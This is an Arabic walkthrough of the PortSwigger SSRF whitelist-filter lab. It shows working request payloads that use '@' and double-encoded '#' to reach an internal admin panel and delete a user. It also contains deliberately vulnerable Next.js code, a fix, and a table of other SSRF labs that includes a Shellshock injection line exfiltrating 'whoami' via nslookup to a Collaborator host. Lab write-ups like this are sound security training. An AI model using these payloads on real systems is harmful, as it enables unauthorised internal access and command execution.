# Lab: SSRF with whitelist-based input filter

> **Category:** SSRF  
> **Difficulty:** EXPERT  
> **Lab Link:** [PortSwigger Lab - SSRF with whitelist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)

---

## 🎯 الهدف الرئيسي

استغلال ثغرة SSRF (Server-Side Request Forgery) في ميزة فحص المخزون (stock check). المطور استخدم **قائمة بيضاء (whitelist)** للتحقق من النطاق (hostname)، ولكن آلية التحليل (parsing) للرابط يمكن تجاوزها باستخدام تقنيات مثل `@` (username) و `#` (fragment) مع ترميز مزدوج.

**المطلوب:** الوصول إلى `http://localhost/admin` وحذف المستخدم `carlos`.

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: فهم ميزة فحص المخزون

- اذهب إلى أي منتج في المتجر
- اضغط على زر **Check stock**
- اعترض طلب `POST /product/stock` في Burp

الطلب الأصلي:

```http
POST /product/stock HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http://stock.weliketoshop.net/product/stock/check
```

### الخطوة 2: اختبار القائمة البيضاء

- حاول تغيير `stockApi` إلى `http://127.0.0.1/`

**النتيجة:** يتم حظر الطلب ❌ (الخادم يتحقق من النطاق بقائمة بيضاء)

### الخطوة 3: استخدام embedded credentials (@)

- جرب استخدام `@` لتضمين اسم مستخدم:

```http
stockApi=http://username@stock.weliketoshop.net/
```

**النتيجة:** يتم قبول الطلب ✅ (الخادم يتحقق فقط من الجزء بعد `@`)

### الخطوة 4: اختبار الرمز (#)

- أضف `#` بعد اسم المستخدم:

```http
stockApi=http://username#@stock.weliketoshop.net/
```

**النتيجة:** يتم رفض الطلب ❌

### الخطوة 5: استخدام Double URL Encoding للرمز (#)

- قم بترميز `#` بشكل مزدوج:
  - `#` → `%23` (ترميز عادي)
  - `%23` → `%2523` (ترميز مزدوج)

```http
stockApi=http://username%2523@stock.weliketoshop.net/
```

**النتيجة:** يظهر خطأ داخلي في الخادم (Internal Server Error) ✅

هذا يشير إلى أن الخادم يحاول الاتصال بـ `username` مباشرة!

### الخطوة 6: بناء الرابط للوصول إلى localhost

نريد أن يصل الخادم إلى `http://localhost/admin`. استخدم نفس التقنية:

```http
stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin
```

### الخطوة 7: إرسال الطلب

- في Repeater، أرسل الطلب:

```http
POST /product/stock HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin
```

**النتيجة:** تظهر واجهة الإدارة (admin panel) ✅

### الخطوة 8: بناء رابط الحذف

لحذف المستخدم `carlos`:

```http
stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

### الخطوة 9: إرسال طلب الحذف

```http
POST /product/stock HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

### الخطوة 10: حل المختبر

بعد حذف `carlos`، سيتم حل المختبر ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **ما هي القائمة البيضاء (whitelist)؟** | الخادم يسمح فقط بالنطاق `stock.weliketoshop.net` |
| **كيف نستخدم `@`؟** | يخبر الـ URL parser أن الجزء قبل `@` هو اسم مستخدم، ويتم التحقق من الجزء بعده فقط |
| **ما هو `#`؟** | رمز الـ fragment، عادة ما يتجاهله الخادم عند معالجة الرابط |
| **لماذا الترميز المزدوج؟** | الخادم يفك الترميز مرة واحدة، ثم يتحقق من النطاق، ثم يفك الترميز مرة أخرى عند الاتصال |

---

## 📊 شرح آلية التجاوز

```
الرابط المرسل:
http://localhost:80%2523@stock.weliketoshop.net/admin

بعد فك الترميز الأول (في مرحلة التحقق):
http://localhost:80%23@stock.weliketoshop.net/admin
                        ↑
                  لا يزال مشفراً

التحقق من النطاق:
يتم استخراج الجزء بعد @ → stock.weliketoshop.net ✅ (مسموح)

بعد فك الترميز الثاني (عند الاتصال الفعلي):
http://localhost:80#@stock.weliketoshop.net/admin
                  ↑
            # يصبح fragment (يتجاهله الخادم)

الطلب النهائي:
http://localhost:80/admin
```

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

الخادم يتحقق من النطاق (hostname) بعد فك الترميز الأول فقط، ثم يفك الترميز مرة أخرى عند الاتصال الفعلي، مما يسمح بتجاوز الفلتر باستخدام ترميز مزدوج.

---

### ❌ Non-Compliant Code (Next.js)

```javascript
// pages/api/stock.js
export default async function handler(req, res) {
  let { stockApi } = req.body;
  
  // خطأ: فك ترميز مرة واحدة فقط
  const decoded = decodeURIComponent(stockApi);
  const url = new URL(decoded);
  
  // التحقق من النطاق بالقائمة البيضاء
  const allowedHosts = ['stock.weliketoshop.net'];
  if (!allowedHosts.includes(url.hostname)) {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  // خطأ: يتم فك الترميز مرة أخرى عند إرسال الطلب
  // لأن fetch يفك ترميز الرابط تلقائياً
  const response = await fetch(stockApi);
  const data = await response.text();
  res.send(data);
}
```

---

### ✅ Compliant Code (Next.js)

```javascript
// pages/api/stock.js
export default async function handler(req, res) {
  let { stockApi } = req.body;
  
  // التصحيح 1: تطبيع الرابط بالكامل قبل التحقق
  // فك جميع الترميزات (بشكل متكرر)
  let normalized = stockApi;
  while (normalized.includes('%')) {
    normalized = decodeURIComponent(normalized);
  }
  
  // التصحيح 2: إزالة أي جزء من الرابط قد يسبب تجاوز
  // إزالة جزء username (قبل @)
  if (normalized.includes('@')) {
    // التحقق من أن الجزء قبل @ ليس محاولة لتجاوز
    const [userInfo, ...rest] = normalized.split('@');
    if (userInfo.includes('#')) {
      return res.status(403).json({ error: 'Invalid URL format' });
    }
    normalized = rest.join('@');
  }
  
  const url = new URL(normalized);
  
  // التصحيح 3: التحقق من النطاق بعد التطبيع الكامل
  const allowedHosts = ['stock.weliketoshop.net'];
  if (!allowedHosts.includes(url.hostname)) {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  // التصحيح 4: التحقق من المسار
  const allowedPaths = ['/product/stock/check'];
  if (!allowedPaths.includes(url.pathname)) {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  // التصحيح 5: منع المنافذ غير المسموحة
  const port = url.port || (url.protocol === 'https:' ? 443 : 80);
  if (port !== 80 && port !== 443) {
    return res.status(403).json({ error: 'Invalid port' });
  }
  
  // التصحيح 6: استخدام الرابط المُطبع (normalized) للطلب
  const response = await fetch(normalized);
  const data = await response.text();
  res.send(data);
}
```

**الخلاصة:** 
1. قم بتطبيع (normalize) الرابط بالكامل قبل التحقق (فك جميع الترميزات)
2. تحقق من النطاق بعد إزالة جزء `@` (username)
3. استخدم whitelist للمسارات أيضاً
4. قم بمنع المنافذ غير القياسية

---

## 🛡️ كيفية الوقاية (How to Prevent)

| الإجراء | الوصف |
|---------|-------|
| **تطبيع الرابط (Normalization)** | قم بفك جميع الترميزات قبل التحقق |
| **إزالة جزء username** | تجاهل أو ارفض أي رابط يحتوي على `@` |
| **التحقق من المسار** | استخدم whitelist للمسارات المسموحة |
| **منع الرموز الخاصة** | ارفض الأحرف مثل `#`, `?`, `@` بعد التطبيع |
| **التحقق من المنفذ** | سمح فقط بالمنافذ 80 و 443 |

---
# 📊 ملخص لابات Server-Side Request Forgery (SSRF)

| # | اللاب | الصعوبة | نوع الثغرة | طريقة الاستغلال |
|---|-------|---------|-----------|----------------|
| 01 | Basic SSRF against the local server | APPRENTICE | SSRF مباشر | تغيير `stockApi` إلى `http://localhost/admin` |
| 02 | Basic SSRF against another back-end system | APPRENTICE | SSRF مع مسح شبكة داخلي | استخدام Burp Intruder لمسح `192.168.0.X:8080` |
| 03 | Blind SSRF with out-of-band detection | PRACTITIONER | Blind SSRF | استخدام Burp Collaborator في هيدر `Referer` |
| 04 | SSRF with blacklist-based input filter | PRACTITIONER | تجاوز قائمة سوداء | `127.1` (اختصار IP) و Double URL Encoding (`%2561`) |
| 05 | SSRF with filter bypass via open redirection | PRACTITIONER | تجاوز عبر Open Redirection | استخدام `/product/nextProduct?path=...` لإعادة التوجيه |
| 06 | Blind SSRF with Shellshock exploitation | EXPERT | Blind SSRF + Shellshock | حقن `() { :; }; /usr/bin/nslookup $(whoami).COLLABORATOR` في `User-Agent` |
| 07 | SSRF with whitelist-based input filter | EXPERT | تجاوز قائمة بيضاء | استخدام `@` و `%2523` (Double URL Encoding) |

---

## 📋 تقنيات تجاوز الفلاتر الشائعة في SSRF

| التقنية | مثال | تستخدم في اللاب |
|----------|-------|----------------|
| اختصار IP | `127.1` بدلاً من `127.0.0.1` | 4 |
| Double URL Encoding | `%2561` بدلاً من `a` | 4, 7 |
| Embedded credentials | `username@host` | 7 |
| Fragment bypass | `username#@host` | 7 |
| Open Redirection | استخدام رابط يعيد التوجيه | 5 |
| مسح الشبكة الداخلية | `192.168.0.1-255` | 2, 6 |
| Shellshock in User-Agent | `() { :; }; command` | 6 |

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)
- [SSRF Cheat Sheet](https://portswigger.net/web-security/ssrf)
- [URL Parsing Vulnerabilities](https://portswigger.net/web-security/ssrf/url-parsing)
